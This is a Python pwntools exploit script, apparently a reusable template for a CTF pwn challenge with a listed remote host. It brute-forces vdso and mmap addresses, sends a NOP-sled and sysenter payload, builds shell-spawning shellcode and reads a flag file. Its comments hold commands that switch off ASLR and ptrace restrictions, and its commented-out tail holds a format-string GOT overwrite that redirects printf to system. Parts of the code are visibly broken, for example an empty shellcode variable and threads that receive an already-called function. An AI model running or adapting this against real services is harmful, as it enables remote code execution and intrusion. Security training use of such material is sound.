from pwn import *
import argparse
import os
import threading

# ulimit -c unlimited
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
# echo 'core' | sudo tee /proc/sys/kernel/core_pattern

LOCAL_PATH = "./vuln"
# socat tcp4-l:8888,reuseaddr,fork exec:./vuln
REMOTE_PATH = ["127.0.0.1", 8888]
REMOTE_PATH = ["pwn2.jarvisoj.com", 9881]

context.log_level = logging.DEBUG

STD_IN  = 0
STD_OUT = 1
STD_ERR = 2

PREFIX = "/bin/sh#"

shellcode_x86 = b""
shellcode_x86 += b""
shellcode_x86 += b""

# get libc by libc-database
"""
# support we known system=830 __libc_start_main=df0
> ./find system 830 __libc_start_main df0
ubuntu-glibc (libc6_2.31-0ubuntu9.1_i386)
ubuntu-glibc (libc6_2.31-0ubuntu9_i386)
> ./dump libc6_2.31-0ubuntu9.1_i386 read
offset_read = 0x000f5c00
> ./dump libc6_2.31-0ubuntu9.1_i386
offset___libc_start_main_ret = 0x1eee5
offset_system = 0x00045830
offset_dup2 = 0x000f68c0
offset_read = 0x000f5c00
offset_write = 0x000f5ca0
offset_str_bin_sh = 0x192352
"""

def i_addr(addr, des):
    log.info("%s => 0x%x", des, addr)

def s_addr(addr, des):
    log.info("%s => 0x%x", des, addr)


class Exploit:
    def __init__(self, offset):
        self.offset = offset
        self._parse_arg()

        self.elf = context.binary = ELF(LOCAL_PATH)
        if self.args.remote:
            context.log_level = logging.INFO
            self.io = remote(*REMOTE_PATH)
        else:
            if not self.args.debug:
                context.log_level = logging.INFO
            self.io = process(LOCAL_PATH)

    def _parse_arg(self):
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "-r",
            "--remote",
            help="Connect to remote server?",
            action="store_true"
        )
        parser.add_argument(
            "-d",
            "--debug",
            help="debug mode",
            action="store_true"
        )

        self.args = parser.parse_args()
        log.info("remote ? => %s", self.args.remote)
        log.info("debug  ? => %s", self.args.debug)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.io.connected():
            self.io.close()

    def save_payload(self, payload):
        with open('payload', 'wb') as f:
            f.write(payload)

    def gdb_debug(self, gdbscript=""):
        log.info('pid => %d', util.proc.pidof(self.io)[0])
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(self.io, gdbscript=gdbscript)

    def get_process(self, log_level=logging.INFO):
        if self.args.remote:
            return remote(*REMOTE_PATH, level=log_level)
        else:
            return process(LOCAL_PATH, level=log_level)

    def send_payload(self, io, payload):
        io.sendlineafter("message:", PREFIX + payload)

    def exec_fmt(self, payload, is_remote=False):
        io = self.get_process(is_remote)
        self.send_payload(io, payload)
        return io.recvall()

    def get_shell(self):
        self.io.interactive()

    def get_flag(self, flag_name="flag"):
        self.io.clean()
        self.io.sendline('cat %s' % flag_name)
        flag = self.io.recv()
        log.success(flag)
        # TODO: save flag as {ip: flag}

    def get_flags(self):
        # TODO:
        pass

    def send_flags(self):
        # TODO: send flags in multi threads or send to flag center
        pass

    def get_vdso(self, io):
        vdso = io.recvuntil(b'[vdso]').split(b'\n')[-1]
        vdso = vdso.split(b'-')[0]
        vdso = int(vdso, 16)
        vdso = vdso & 0xffffffff
        return vdso

    def brute_vdso_task(self, progress):
        io = None
        vdso = 0

        x = 1000 << 12
        i_got = False
        while self._is_brute_vdso_ok is False:
            io = self.get_process(log_level=logging.ERROR)
            vdso = self.get_vdso(io)
            progress.status(hex(vdso))
            if vdso <= x:
                self._is_brute_vdso_ok = True
                i_got = True
                break
            io.clean()
            io.close()
        if i_got:
            self.io = io
            self.vdso = vdso
            progress.success(hex(vdso))

    def stage_1(self,):
        """
        brute force vdso
        """
        self.io.close()
        self._is_brute_vdso_ok = False
        p = log.progress("brute forcing vdso")
        threads = [threading.Thread(target=self.brute_vdso_task(p)) for i in range(32)]
        for t in threads: t.start()
        for t in threads: t.join()

    def stage_2(self,):
        """
        brute force mmap addr
        """

        def choose_b():
            self.io.recvuntil(b'cow beer\n\n')
            self.io.sendline(b'b')

        def get_mmap_addr():
            addr = self.io.recvuntil(b'\n\nWelcome')
            addr = addr.split(b'@')[-1]
            addr = addr.split(b'\n\n')[0]
            addr = int(addr, 16)
            return addr

        p = log.progress('brute force mmap addr')
        while True:
            choose_b()
            addr = get_mmap_addr()
            p.status(hex(addr))
            if addr == self.vdso:
                break
        self.mmap_addr = addr
        p.success(hex(self.mmap_addr))

    def stage_3(self,):
        """
        exploit to get shell
        """
        self.io.recvuntil(b'cow beer\n\n')
        self.io.sendline(b'h')
        self.io.recvuntil(b'gib:\n')

        # context.update(arch='i386', bits=32, log_level=logging.DEBUG)
        context.update(arch='i386', bits=32)

        shellcode = asm('mov esp, %d\n' % self.mmap_addr) + asm(shellcraft.i386.sh())

        payload = flat([
            b'\x90' * 0x200,
            asm('sysenter') 
        ])
        # payload = payload.ljust(0x1000, b'\x90')
        payload = payload.ljust(0x1000, b'A')

        input(b'waiting for debug')

        self.io.sendline(payload)


    def run(self):
        self.stage_1()
        self.stage_2() 
        self.stage_3() 

        self.get_shell()
        # self.get_flag()

def main():
    # find stack overflow offset
    """
    ragg2 -P 0x200 -r | ./vuln
    """

    # x86
    """
    r2 -qc 'wopO `dr eip`' core
    """

    # x64 get 1 column, 0 row
    """
    r2 -qc 'wopO `pxr @rbp ~[1] :[0]`' core # result +8
    r2 -qc 'wopO `pxr 0x8 @rbp ~[0]`' core  # result +8
    r2 -qc 'wopO `pxr 0x8 @rsp ~[1]`' core
    """
    with Exploit(112) as e:
        e.run()

if __name__ == '__main__':
    main()

# e = ELF(LOCAL_PATH)
# context.binary = e.path

# autofmt = FmtStr(exec_fmt)

# writes = {e.got['puts']: e.symbols['vuln'], e.got['printf']: e.plt['system']}
# log.info("Address of puts() .got.plt: {}".format(hex(e.got['puts'])))
# log.info("Address of printf() .got.plt: {}".format(hex(e.got['printf'])))
# log.info("Address of vuln(): {}".format(hex(e.symbols['vuln'])))
# log.info("Address of system() .plt: {}".format(hex(e.plt['system'])))

# payload = fmtstr_payload(autofmt.offset, writes, numbwritten=len(PREFIX))
# log.info("Payload: {}".format(enhex(payload)))

# p = get_process(args.is_remote)
# send_payload(p, payload)
# p.interactive()
